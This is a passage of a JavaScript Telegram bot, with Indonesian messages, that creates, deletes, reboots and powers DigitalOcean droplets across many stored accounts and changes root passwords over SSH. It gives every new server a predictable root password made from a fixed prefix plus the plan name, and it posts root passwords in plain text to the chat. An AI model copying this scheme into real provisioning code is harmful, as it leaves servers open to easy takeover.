    return ctx.answerCbQuery("❌ Session expired, ulangi perintah /deldroplet");
  }
  
  session.currentPage = page;
  doSession.set(userId, session);
  
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  await sendDelPage(ctx, userId, page);
});

bot.action("del_cancel", async (ctx) => {
  const userId = ctx.from.id.toString();
  doSession.delete(userId);
  await ctx.answerCbQuery("Dibatalkan");
  await ctx.deleteMessage().catch(() => {});
});

bot.action(/^del_select:(.+):(.+)$/, async (ctx) => {
  const version = ctx.match[1];
  const dropletId = ctx.match[2];
  
  const userId = ctx.from.id.toString();
  const apiKey = apiDigitalOcean[`akun${version}`];

  await ctx.answerCbQuery();
  
  // Hapus session
  doSession.delete(userId);

  let foundDroplet = null;  
  let foundAkun = null;  

  await ctx.editMessageText("<blockquote>🔍 <b>Mencari VPS...</b></blockquote>", { parse_mode: "HTML" });  
  
  try {  
    const result = await doApiRequest(apiKey, '/droplets');
    if (result.success) {
      const droplets = result.data.droplets || [];
      let d = droplets.find(x => x.id.toString() === dropletId);  

      if (d) {  
        foundDroplet = d;  
        foundAkun = version;  
      }  
    }
  } catch (err) {
    console.error(`Error checking akun V${version}:`, err);
  }  

  if (!foundDroplet)  
    return ctx.editMessageText("<blockquote>❌ <b>VPS tidak ditemukan di akun V${version}.</b></blockquote>", { parse_mode: "HTML" });  

  let ip = foundDroplet.networks.v4.find(n => n.type === "public")?.ip_address || "Tidak ada";  
  
  let text =  
    `<blockquote>🗑 <b>HAPUS VPS?</b>\n\n` +  
    `🆔 <b>ID:</b> ${foundDroplet.id}\n` +  
    `💽 <b>Hostname:</b> ${foundDroplet.name}\n` +  
    `🌐 <b>IP:</b> ${ip}\n` +  
    `🧩 <b>Spec:</b> ${foundDroplet.memory}MB | ${foundDroplet.vcpus}vCPU | ${foundDroplet.disk}GB\n` +  
    `🌍 <b>Akun DO:</b> V${foundAkun}\n\n` +  
    `⚠️ <b>Aksi ini tidak bisa dibatalkan!</b></blockquote>`;  

  await ctx.editMessageText(text, {  
    parse_mode: "HTML",  
    reply_markup: {  
      inline_keyboard: [  
        [Markup.button.callback("✅ Lanjutkan", `delvps_yes:${foundAkun}:${foundDroplet.id}`)],  
        [Markup.button.callback("❌ Batalkan", "delvps_no")]  
      ]  
    }  
  });
});

// ---------- [ Command: rebuild ] ------------ \\  
bot.command("rebuild", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (args.length < 2)  
    return ctx.reply("<blockquote>⚠️ <b>Contoh:</b>\n/rebuild 123456789</blockquote>", { parse_mode: "HTML" });  

  const dropletId = args[1];
  
  // Simpan ke session rebuild
  if (!doSession) global.doSession = new Map();
  doSession.set(userId, { dropletId, currentPage: 0 });
  
  await sendRebuildPage(ctx, userId, 0);
});

async function sendRebuildPage(ctx, userId, page) {
  const session = doSession.get(userId);
  if (!session) return;
  
  const itemsPerPage = 5;
  const startIdx = page * itemsPerPage;
  const endIdx = startIdx + itemsPerPage;
  
  let keyboard = [];
  
  for (let i = startIdx + 1; i <= Math.min(endIdx, 50); i++) {  
    const api = apiDigitalOcean[`akun${i}`];  
    const status = api && api.length >= 64 ? "✅" : "❌";  
    keyboard.push([  
      Markup.button.callback(
        `${status} Akun DO V${i}`,  
        `rb_select:${session.dropletId}:${i}`
      )
    ]);  
  }
  
  // Tombol navigasi
  const navButtons = [];
  const totalPages = Math.ceil(50 / itemsPerPage);
  
  if (page > 0) {
    navButtons.push(Markup.button.callback("◀️ Sebelumnya", `rebuild_page:${page - 1}`));
  }
  
  navButtons.push(Markup.button.callback(`${page + 1}/${totalPages}`, "no_action"));
  
  if (page < totalPages - 1) {
    navButtons.push(Markup.button.callback("Lanjutkan ▶️", `rebuild_page:${page + 1}`));
  }
  
  keyboard.push(navButtons);
  
  keyboard.push([Markup.button.callback("❌ Batalkan", "rebuild_cancel")]);

  await ctx.reply(
`<blockquote>🔧 <b>Pilih akun DO untuk Rebuild</b>
🆔 Droplet ID: <b>${session.dropletId}</b>
➡️ Halaman: <b>${page + 1}/${totalPages}</b></blockquote>`,  
    { 
      parse_mode: "HTML",  
      reply_markup: { inline_keyboard: keyboard }
    }
  );
}

bot.action(/^rebuild_page:(\d+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const page = parseInt(ctx.match[1]);
  
  const session = doSession.get(userId);
  if (!session) {
    return ctx.answerCbQuery("❌ Session expired, ulangi perintah /rebuild");
  }
  
  session.currentPage = page;
  doSession.set(userId, session);
  
  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});
  await sendRebuildPage(ctx, userId, page);
});

bot.action("rebuild_cancel", async (ctx) => {
  const userId = ctx.from.id.toString();
  doSession.delete(userId);
  await ctx.answerCbQuery("Dibatalkan");
  await ctx.deleteMessage().catch(() => {});
});

// ---------- [ Command: gantipwvps ] ------------ \\  
bot.command("gantipwvps", async (ctx) => {
  const userId = ctx.from.id.toString();
  const argsText = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (!argsText) {
    return ctx.reply(
      `<blockquote>❌ <b>Format Salah</b>\nContoh:/gantipwvps ipvps|pwvps|pwbaru</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const t = argsText.split("|");
  if (t.length < 3) {
    return ctx.reply(
      "<blockquote>❌ <b>Format Salah</b>\nContoh:/gantipwvps ipvps|pwvps|pwbaru</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  const ipvps = t[0];
  const passwd = t[1];
  const newPass = t[2];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: "root",
    password: passwd,
  };

  const conn = new Client();

  conn
    .on("ready", () => {
      conn.exec("passwd", (err, stream) => {
        if (err) {
          conn.end();
          return ctx.reply("❌ Gagal eksekusi perintah di VPS!");
        }

        stream  
          .on("close", () => {  
            conn.end();  
          })  
          .on("data", (data) => {  
            console.log("STDOUT:", data.toString());  
          })  
          .stderr.on("data", async (data) => {  
            const dataStr = data.toString();
            if (dataStr.includes("New password:")) {
              stream.write(`${newPass}\n`);
            } else if (dataStr.includes("Retype new password:")) {
              stream.write(`${newPass}\n`);
            } else if (dataStr.includes("password updated successfully")) {  
              await ctx.reply(
`<blockquote>✅ <b>Password VPS berhasil diubah</b>
🔐 Pass Lama: <code>${passwd}</code>
🆕 Pass baru: <code>${newPass}</code></blockquote>`,
                { parse_mode: "HTML" }
              );
            }
          });
      });
    })
    .on("error", (err) => {
      console.log("Connection Error:", err.message);
      ctx.reply("❌ IP atau password VPS tidak valid!");
    })
    .connect(connSettings);
});

// ---------- [ Command: restartvps ] ------------ \\  
bot.command("restartvps", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (args.length < 2) {  
    return ctx.reply("⚠️ Contoh:\n/restartvps 123456789");  
  }  

  const dropletId = args[1];
  let found = false;  
  let errors = [];  

  for (let i = 1; i <= 50; i++) {  
    const apiKey = apiDigitalOcean[`akun${i}`];  
    if (!apiKey || apiKey === "-" || apiKey.length < 60) continue;  

    try {  
      const result = await doApiRequest(apiKey, '/droplets');
      if (!result.success) {
        errors.push(`❌ DO V${i}: API key tidak valid`);
        continue;
      }

      const droplets = result.data.droplets || [];
      let matched = droplets.find(d => d.id.toString() === dropletId);  

      if (matched) {  
        found = true;  

        const restartResult = await doApiRequest(
          apiKey, 
          `/droplets/${dropletId}/actions`, 
          'POST', 
          { type: "reboot" }
        );

        if (!restartResult.success) {  
          return ctx.reply(  
            `<blockquote>❌ Gagal <b>restart</b> VPS:\n🌟 V${i}\n${restartResult.error || "Unknown error"}</blockquote>`,  
            { parse_mode: "HTML" }  
          );  
        }  

        const restartData = restartResult.data;

        let msgSuccess = `
<blockquote>🛠️ <b>Restart VPS Berhasil Dimulai!</b>
🧩 Informasi VPS
• 🆔 ID: <code>${dropletId}</code>
• 🌀 API: DigitalOcean V${i}
• 📶 Status: ${restartData.action.status}
⌛ <b>Estimasi Waktu:</b>
VPS akan kembali aktif dalam 45–60 detik.
⚠️ Jika setelah 1 menit belum aktif, coba cek status droplet di panel DO.</blockquote>`;

        return ctx.reply(msgSuccess, { parse_mode: "HTML" });  
      }  
    } catch (err) {  
      console.log(`Error DO V${i}:`, err);  
      errors.push(`❌ DO V${i}: Tidak dapat menghubungi API`);  
    }  
  }  

  if (!found) {  
    let msgError = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di *50 akun DO*.\n`;  
    if (errors.length > 0) msgError += `\n${errors.join("\n")}`;  

    return ctx.reply(msgError, { parse_mode: "Markdown" });  
  }
});

// ---------- [ Command: startvps And stopvps ] ------------ \\  
bot.command(["startvps", "stopvps"], async (ctx) => {
  const command = ctx.message.text.split(" ")[0].replace("/", "");
  const args = ctx.message.text.split(" ");
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

  if (args.length < 2) {  
    return ctx.reply(`⚠️ Contoh:\n/${command} 123456789`);  
  }  

  const dropletId = args[1];
  let found = false;  
  let errors = [];  

  let actionType = command === "startvps" ? "power_on" : "power_off";  
  let actionLabel = command === "startvps" ? "start" : "stop";  

  for (let i = 1; i <= 50; i++) {  
    const apiKey = apiDigitalOcean[`akun${i}`];  
    if (!apiKey || apiKey === "-" || apiKey.length < 60) continue;  

    try {  
      const result = await doApiRequest(apiKey, '/droplets');
      if (!result.success) {  
        errors.push(`❌ DO V${i}: API key tidak valid`);  
        continue;  
      }  

      const droplets = result.data.droplets || [];
      let matched = droplets.find(d => d.id.toString() === dropletId);  

      if (matched) {  
        found = true;  

        const actionResult = await doApiRequest(
          apiKey, 
          `/droplets/${dropletId}/actions`, 
          'POST', 
          { type: actionType }
        );

        if (!actionResult.success) {  
          return ctx.reply(  
            `<blockquote>❌ Gagal <b>${actionLabel}</b> VPS:\n🌟 V${i}\n${actionResult.error || "Unknown error"}</blockquote>`,  
            { parse_mode: "HTML" }  
          );  
        }  

        const actionData = actionResult.data;

        return ctx.reply(`
<blockquote>✅ <b>Aksi ${actionLabel} VPS dimulai!</b>
📡 <b>Droplet ID:</b> ${dropletId}
🌟 <b>Akun DO:</b> V${i}
🔄 <b>Status:</b> ${actionData.action.status}
⏳ Tunggu beberapa saat hingga VPS <b>${actionLabel === "start" ? "menyala" : "mati"}</b>.</blockquote>`,  
          { parse_mode: "HTML" }  
        );  
      }  
    } catch (err) {  
      console.log(`Error DO V${i}:`, err);  
      errors.push(`❌ DO V${i}: Gagal menghubungi API`);  
    }  
  }  

  if (!found) {  
    let errorMsg = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun manapun.\n`;  
    if (errors.length > 0) {  
      errorMsg += `\n${errors.join("\n")}`;  
    }  

    return ctx.reply(errorMsg, { parse_mode: "Markdown" });  
  }
});

// Callback: Batalkan cvps
bot.action("cvps_cancel", async (ctx) => {
  const userId = ctx.from.id.toString();
  doSession.delete(userId);
  await ctx.answerCbQuery("Dibatalkan");
  await ctx.deleteMessage().catch(() => {});
  await ctx.reply("❌ Proses pembuatan VPS dibatalkan.");
});

// Callback: Pilih Account
bot.action(/^cvps_pick:(.+)$/, async (ctx) => {
  const version = ctx.match[1];  
  const userId = ctx.from.id.toString();
  const hostname = doSession.get(userId)?.hostname;  

  if (!hostname) {  
    return ctx.answerCbQuery("Session expired. Ulangi cvps hostname.", {  
      show_alert: true  
    });  
  }  

  const apikeyDO = apiDigitalOcean[`akun${version}`];  
  if (!apikeyDO || apikeyDO.length < 64) {  
    return ctx.answerCbQuery(`API Key DigitalOcean V${version} tidak valid!`, {  
      show_alert: true  
    });  
  }  

  doSession.set(userId, { ...doSession.get(userId), version });  
  await ctx.answerCbQuery();  

  const ramCPU = [  
    ["💻 RAM 1GB | CPU 1 Core", "1c1"],  
    ["💻 RAM 2GB | CPU 1 Core", "2c1"],  
    ["💻 RAM 2GB | CPU 2 Core", "2c2"],  
    ["💻 RAM 4GB | CPU 2 Core", "4c2"],  
    ["💻 RAM 8GB | CPU 4 Core", "8c4"],  
    ["💻 RAM 16GB | CPU 4 Core", "16c4"],  
    ["💻 RAM 16GB | CPU 8 Core", "16c8"],  
    ["💻 RAM 32GB | CPU 8 Core", "32c8"]  
  ];  

  const keyboard = ramCPU.map(v => [  
    Markup.button.callback(v[0], `cvps_ram:${version}:${v[1]}`)
  ]);  

  keyboard.push([Markup.button.callback("◀️ Kembali", `cvps_back_to_accounts:${userId}`)]);

  try {
    await ctx.editMessageText(
`<blockquote>🌐 <b>Akun DigitalOcean V${version} Dipilih!</b>\n
Hostname: <b>${hostname}</b>
Silakan pilih <b>AM & CPU</b> yang ingin digunakan:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>🌐 <b>Akun DigitalOcean V${version} Dipilih!</b>\n
Hostname: <b>${hostname}</b>
Silakan pilih <b>AM & CPU</b> yang ingin digunakan:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: Kembali Pilih Account
bot.action(/^cvps_back_to_accounts:(.+)$/, async (ctx) => {
  const userId = ctx.match[1];
  const sessionData = doSession.get(userId);
  
  if (!sessionData?.hostname) {
    return ctx.answerCbQuery("Session expired", { show_alert: true });
  }
  
  const totalAkun = Object.keys(apiDigitalOcean).filter(akun => 
    apiDigitalOcean[akun] && apiDigitalOcean[akun].length >= 64
  ).length;
    
  let keyboard = [];  
  for (let i = 1; i <= 50; i++) {  
    let api = apiDigitalOcean[`akun${i}`];  
    const isValid = api && api.length >= 64;
    keyboard.push([  
      Markup.button.callback(
        isValid ? `V${i} ✅` : `V${i} ❌`,  
        `cvps_pick:${i}`
      )
    ]);  
  }  

  keyboard.push([Markup.button.callback("❌ Batalkan", "cvps_cancel")]);

  try {
    await ctx.editMessageText(
`<blockquote>📌 <b>Pembuatan VPS DigitalOcean</b>
➡️ Hostname: <b>${sessionData.hostname}</b>
➡️ Total Akun Valid: <b>${totalAkun} akun</b>
Silakan pilih akun DigitalOcean yang ingin digunakan ⬇️</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>📌 <b>Pembuatan VPS DigitalOcean</b>
➡️ Hostname: <b>${sessionData.hostname}</b>
➡️ Total Akun Valid: <b>${totalAkun} akun</b>
Silakan pilih akun DigitalOcean yang ingin digunakan ⬇️</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: RAM → PILIH OS
bot.action(/^cvps_ram:(.+):(.+)$/, async (ctx) => {
  const version = ctx.match[1];
  const plan = ctx.match[2];
  const userId = ctx.from.id.toString();

  doSession.set(userId, { ...doSession.get(userId), plan });  

  const hostname = doSession.get(userId)?.hostname;  
  if (!hostname) {  
    return ctx.answerCbQuery("Session expired! Ulangi /cvps dulu.", {  
      show_alert: true  
    });  
  }  

  await ctx.answerCbQuery();  

  const osList = [  
    { name: "Ubuntu 20.04", slug: "ubuntu-20-04-x64" },  
    { name: "Ubuntu 22.04", slug: "ubuntu-22-04-x64" },  
    { name: "Ubuntu 24.04", slug: "ubuntu-24-04-x64" },  
    { name: "Ubuntu 25.04", slug: "ubuntu-25-04-x64" },  
    { name: "Ubuntu 25.10", slug: "ubuntu-25-10-x64" },  
    { name: "Fedora 42", slug: "fedora-42-x64" },  
    { name: "Debian 12", slug: "debian-12-x64" },  
    { name: "Debian 13", slug: "debian-13-x64" },  
    { name: "CentOS Stream 9", slug: "centos-stream-9-x64" },  
    { name: "CentOS Stream 10", slug: "centos-stream-10-x64" },  
    { name: "AlmaLinux 8", slug: "almalinux-8-x64" },  
    { name: "AlmaLinux 9", slug: "almalinux-9-x64" },  
    { name: "AlmaLinux 10", slug: "almalinux-10-x64" },  
    { name: "Rocky Linux 8", slug: "rockylinux-8-x64" },  
    { name: "Rocky Linux 9", slug: "rockylinux-9-x64" },  
    { name: "Rocky Linux 10", slug: "rockylinux-10-x64" }  
  ];  

  const keyboard = osList.map(os => [  
    Markup.button.callback(`🔵 ${os.name}`, `cvps_os:${version}:${os.slug}`)
  ]);  

  keyboard.push([Markup.button.callback("◀️ Kembali", `cvps_back_to_ram:${userId}:${version}`)]);

  try {
    await ctx.editMessageText(
`<blockquote>💻 <b>RAM & CPU Dipilih:</b> ${plan}
Hostname: <b>${hostname}</b>
Silakan pilih <b>Operating System</b>:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>💻 <b>RAM & CPU Dipilih:</b> ${plan}
Hostname: <b>${hostname}</b>
Silakan pilih <b>Operating System</b>:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: Kembali ke pilih Ram
bot.action(/^cvps_back_to_ram:(.+):(.+)$/, async (ctx) => {
  const userId = ctx.match[1];
  const version = ctx.match[2];
  const sessionData = doSession.get(userId);
  
  if (!sessionData?.hostname) {
    return ctx.answerCbQuery("Session expired", { show_alert: true });
  }
  
  const ramCPU = [  
    ["💻 RAM 1GB | CPU 1 Core", "1c1"],  
    ["💻 RAM 2GB | CPU 1 Core", "2c1"],  
    ["💻 RAM 2GB | CPU 2 Core", "2c2"],  
    ["💻 RAM 4GB | CPU 2 Core", "4c2"],  
    ["💻 RAM 8GB | CPU 4 Core", "8c4"],  
    ["💻 RAM 16GB | CPU 4 Core", "16c4"],  
    ["💻 RAM 16GB | CPU 8 Core", "16c8"],  
    ["💻 RAM 32GB | CPU 8 Core", "32c8"]  
  ];  

  const keyboard = ramCPU.map(v => [  
    Markup.button.callback(v[0], `cvps_ram:${version}:${v[1]}`)
  ]);  

  keyboard.push([Markup.button.callback("◀️ Kembali", `cvps_back_to_accounts:${userId}`)]);

  try {
    await ctx.editMessageText(
`<blockquote>🌐 <b>kun DigitalOcean V${version} Dipilih!</b>
Hostname: <b>${sessionData.hostname}</b>
Silakan pilih <b>RAM & CPU</b> yang ingin digunakan:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>🌐 <b>kun DigitalOcean V${version} Dipilih!</b>
Hostname: <b>${sessionData.hostname}</b>
Silakan pilih <b>RAM & CPU</b> yang ingin digunakan:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: OS → PILIH REGION
bot.action(/^cvps_os:(.+):(.+)$/, async (ctx) => {
  const version = ctx.match[1];
  const osSlug = ctx.match[2];
  const userId = ctx.from.id.toString();

  await ctx.answerCbQuery();  

  doSession.set(userId, { ...doSession.get(userId), os: osSlug });  

  const plan = doSession.get(userId)?.plan;  
  const hostname = doSession.get(userId)?.hostname;  

  if (!plan || !hostname) {  
    return ctx.answerCbQuery("Session hilang! Jalankan /cvps lagi.", {  
      show_alert: true  
    });  
  }  

  const regions = [  
    ["🇸🇬 Singapore [ rekomendasi ]", "sgp1"],  
    ["🇺🇸 New York", "nyc3"],  
    ["🇺🇸 San Francisco", "sfo3"],  
    ["🇳🇱 Amsterdam", "ams3"],  
    ["🇬🇧 London", "lon1"],  
    ["🇩🇪 Frankfurt", "fra1"],  
    ["🇨🇦 Toronto", "tor1"],  
    ["🇮🇳 Bangalore", "blr1"],  
    ["🇦🇺 Sydney", "syd1"]  
  ];  

  const keyboard = regions.map(r => [  
    Markup.button.callback(r[0], `cvps_region:${version}:${osSlug}:${plan}:${r[1]}`)
  ]);  

  keyboard.push([Markup.button.callback("◀️ Kembali", `cvps_back_to_os:${userId}:${version}:${plan}`)]);

  try {
    await ctx.editMessageText(
`<blockquote>🌍 <b>Pilih Region VPS</b>
🖥 OS: <b>${osSlug}</b>
💾 Plan: <b>${plan}</b>
📛 Hostname: <b>${hostname}</b>
Silakan pilih region:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>🌍 <b>Pilih Region VPS</b>
🖥 OS: <b>${osSlug}</b>
💾 Plan: <b>${plan}</b>
📛 Hostname: <b>${hostname}</b>
Silakan pilih region:</blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: Kembali ke pilih OS
bot.action(/^cvps_back_to_os:(.+):(.+):(.+)$/, async (ctx) => {
  const userId = ctx.match[1];
  const version = ctx.match[2];
  const plan = ctx.match[3];
  const sessionData = doSession.get(userId);
  
  if (!sessionData?.hostname) {
    return ctx.answerCbQuery("Session expired", { show_alert: true });
  }
  
  const osList = [  
    { name: "Ubuntu 20.04", slug: "ubuntu-20-04-x64" },  
    { name: "Ubuntu 22.04", slug: "ubuntu-22-04-x64" },  
    { name: "Ubuntu 24.04", slug: "ubuntu-24-04-x64" },  
    { name: "Ubuntu 25.04", slug: "ubuntu-25-04-x64" },  
    { name: "Ubuntu 25.10", slug: "ubuntu-25-10-x64" },  
    { name: "Fedora 42", slug: "fedora-42-x64" },  
    { name: "Debian 12", slug: "debian-12-x64" },  
    { name: "Debian 13", slug: "debian-13-x64" },  
    { name: "CentOS Stream 9", slug: "centos-stream-9-x64" },  
    { name: "CentOS Stream 10", slug: "centos-stream-10-x64" },  
    { name: "AlmaLinux 8", slug: "almalinux-8-x64" },  
    { name: "AlmaLinux 9", slug: "almalinux-9-x64" },  
    { name: "AlmaLinux 10", slug: "almalinux-10-x64" },  
    { name: "Rocky Linux 8", slug: "rockylinux-8-x64" },  
    { name: "Rocky Linux 9", slug: "rockylinux-9-x64" },  
    { name: "Rocky Linux 10", slug: "rockylinux-10-x64" }  
  ];  

  const keyboard = osList.map(os => [  
    Markup.button.callback(`🔵 ${os.name}`, `cvps_os:${version}:${os.slug}`)
  ]);  

  keyboard.push([Markup.button.callback("◀️ Kembali", `cvps_back_to_ram:${userId}:${version}`)]);

  try {
    await ctx.editMessageText(
`<blockquote>💻 <b>RAM & CPU Dipilih:</b> ${plan} 
Hostname: <b>${sessionData.hostname}</b>
Silakan pilih <b>Operating System</b></blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  } catch (error) {
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
`<blockquote>💻 <b>RAM & CPU Dipilih:</b> ${plan} 
Hostname: <b>${sessionData.hostname}</b>
Silakan pilih <b>Operating System</b></blockquote>`,  
      {  
        parse_mode: "HTML",  
        reply_markup: { inline_keyboard: keyboard }  
      }  
    );
  }
});

// Callback: Region dipilih → pembuatan Vps
bot.action(/^cvps_region:(.+):(.+):(.+):(.+)$/, async (ctx) => {
  const version = ctx.match[1];
  const os = ctx.match[2];
  const plan = ctx.match[3];
  const region = ctx.match[4];
  const userId = ctx.from.id.toString();

  await ctx.answerCbQuery();  

  const hostname = doSession.get(userId)?.hostname;  
  if (!hostname) {  
    return ctx.reply("❌ Session expired. Ulangi /cvps hostname");  
  }  

  const apiDO = apiDigitalOcean[`akun${version}`];  
  if (!apiDO || apiDO.length < 64) {  
    return ctx.reply(`🚫 API Key Akun DO V${version} tidak valid!`);  
  }  

  const sizeMap = {  
    "1c1": "s-1vcpu-1gb-amd",  
    "2c1": "s-1vcpu-2gb-amd",  
    "2c2": "s-2vcpu-2gb-amd",  
    "4c2": "s-2vcpu-4gb-amd",  
    "8c4": "s-4vcpu-8gb-amd",  
    "16c4": "s-4vcpu-16gb-amd",  
    "16c8": "s-8vcpu-16gb-amd",  
    "32c8": "s-8vcpu-32gb-amd"  
  };  

  const size = sizeMap[plan];  
  const password = "AldzyIsHere#" + size.replace("s-", "").replace(/-/g, "").toUpperCase();  

  try {
    await ctx.editMessageText(
`<blockquote>⏳ <b>SEDANG MEMUAT VPS...</b>
Hostname: ${hostname}</blockquote>`,  
      {  
        parse_mode: "HTML"  
      }  
    );
  } catch (error) {
    await ctx.reply(
`<blockquote>⏳ <b>SEDANG MEMUAT VPS...</b>
Hostname: ${hostname}</blockquote>`, 
      {  
        parse_mode: "HTML"  
      }  
    );
  }

  try {  
    const payload = {  
      name: hostname,  
      region: region,  
      size: size,  
      image: os,  
      ipv6: true,  
      backups: false,  
      tags: ["Jangan Lupa Support AldzyIsHere"],  
      user_data: `#cloud-config\n\npassword: ${password}\nchpasswd: { expire: False }`
    };

    const result = await doApiRequest(apiDO, '/droplets', 'POST', payload);

    if (!result.success) {  
      return ctx.reply(`❌ Gagal Membuat VPS:\n${result.error}`);  
    }  

    const json = result.data;
    const dropletId = json.droplet.id;  

    const waitingMsg = await ctx.reply(`⏳ Menunggu IP VPS (±50 detik)...`);  

    await new Promise(r => setTimeout(r, 50000));  

    const cekResult = await doApiRequest(apiDO, `/droplets/${dropletId}`);

    const dropletInfo = cekResult.success ? cekResult.data : null;
    const ip = dropletInfo?.droplet?.networks?.v4?.[0]?.ip_address || "N/A";
    const createdAt = new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      weekday: "long",
      day: "numeric",
      month: "long",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });

    try {
      await ctx.deleteMessage(waitingMsg.message_id);
    } catch (e) {}

    try {
      await ctx.deleteMessage();
    } catch (e) {}
    
    doSession.delete(userId);
    
    await ctx.reply(
      `✅ *VPS BERHASIL DIBUAT!*\n` +
      `===============================\n` +
      `🆔 *ID Droplet:* \`${dropletId}\`\n` +  
      `👤 Username: \`root\`\n` +  
      `🌐 IP VPS: \`${ip}\`\n` +  
      `🔐 Password: \`${password}\`\n` +  
      `🖥 Hostname: ${hostname}\n` +  
      `📀 OS: ${os}\n` +  
      `📍 Region: ${region}\n` +  
      `💾 Size: ${size}\n` +  
      `⏰ Created: ${createdAt}\n` +  
      `===============================\n` +  
      `🎉 GARANSI AKTIF 10 HARI\n` +  
      `Apabila tidak melanggar T.O.S\n` +  
      `===============================\n\n` +  
      `⚠️ 𝗧.𝗢.𝗦 VPS (Terms of Service VPS)\n` +  
      `• Dilarang Hacking\n` +  
      `• Dilarang Mining (Crypto/Sejenisnya)\n` +  
      `• Dilarang Torrent\n` +  
      `• Dilarang Overload CPU (100% terus-menerus)\n` +  
      `• Dilarang DDoS\n` +  
      `• Dilarang Aktivitas Ilegal dalam bentuk apa pun\n\n` +  
      `👉 Intinya: Gunakan VPS dengan bijak & sesuai kebutuhan normal.\n\n` +  
      `===============================\n\n` +  
      `🏪 𝗧.𝗢.𝗦 TOKO (Ketentuan Garansi Toko)\n` +  
      `• Web toko down karena DDoS, tapi VPS normal → Garansi AKTIF\n` +  
      `• VPS mati akibat DDoS → Garansi HANGUS\n` +  
      `• VPS aktif tapi tidak bisa login (CPU 100%) → Garansi HANGUS\n` +  
      `• Data VPS tanggung jawab pembeli → Hilang = Garansi HANGUS\n` +  
      `• Mohon gunakan VPS sesuai aturan agar garansi tetap berlaku\n\n` +  
      `===============================\n\n` +  
      `📛 𝗞𝗘𝗧𝗘𝗡𝗧𝗨𝗔𝗡 AKUN DO SUSPEND\n` +  
      `Jika akun DigitalOcean terkena suspend:\n` +  
      `• Garansi hanya berlaku 2 hari sejak pembelian\n` +  
      `• Hari ke-3 dan seterusnya → Garansi Tidak Berlaku\n\n` +  
      `===============================\n\n` +  
      `📝 SYARAT CLAIM GARANSI\n` +  
      `1. Sertakan bukti transfer\n` +  
      `2. Screenshot chat saat pembelian\n` +  
      `3. Cantumkan tanggal pembelian\n` +  
      `4. Lampirkan data VPS (IP, Username, Password, dsb.)\n\n` +  
      `===============================\n` +  
      `© REAL AldzyIsHere — Hosting Since 2026\n\n` +  
      `📢 PERINGATAN:\n` +  
      `Seluruh isi & format teks ini dilindungi hukum.\n` +  
      `📌 Dilarang copy-paste tanpa izin.\n` +  
      `📌 Pelanggaran akan dikenakan sanksi sesuai UU Hak Cipta No. 28 Tahun 2014.\n` +  
      `===============================`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {  
    ctx.reply(`❌ Error Create VPS:\n${err.message}`);  
  }
});

// Callback: Cek Sisah Vps
bot.action(/^cv_check:(.+)$/, async (ctx) => {
  const version = ctx.match[1];
  const apiKey = apiDigitalOcean[`akun${version}`];

  if (!apiKey || apiKey.length < 64) {  
    return ctx.answerCbQuery("❌ API Key tidak valid!", { show_alert: true });  
  }  

  await ctx.answerCbQuery();  

  try {  
    const [accResult, drpResult] = await Promise.all([  
      doApiRequest(apiKey, '/account'),
      doApiRequest(apiKey, '/droplets')
    ]);  

    if (!accResult.success || !drpResult.success)  
      return ctx.editMessageText(  
        `<blockquote>❌ <b>Gagal mengambil data Akun V${version}</b></blockquote>`,  
        { parse_mode: "HTML" }  
      );  

    const accData = accResult.data;  
    const drpData = drpResult.data;  

    const email = accData.account.email;  
    const status = accData.account.status;  
    const limit = accData.account.droplet_limit;  
    const used = (drpData.droplets || []).length;  
    const remain = limit - used;  

    return ctx.editMessageText(  
      `<blockquote>🌐 <b>DIGITALOCEAN STATUS</b>\n\n` +  
      `🌟 <b>Akun DigitalOcean V${version}</b>\n` +  
      `📧 <b>Email:</b> ${email}\n` +  
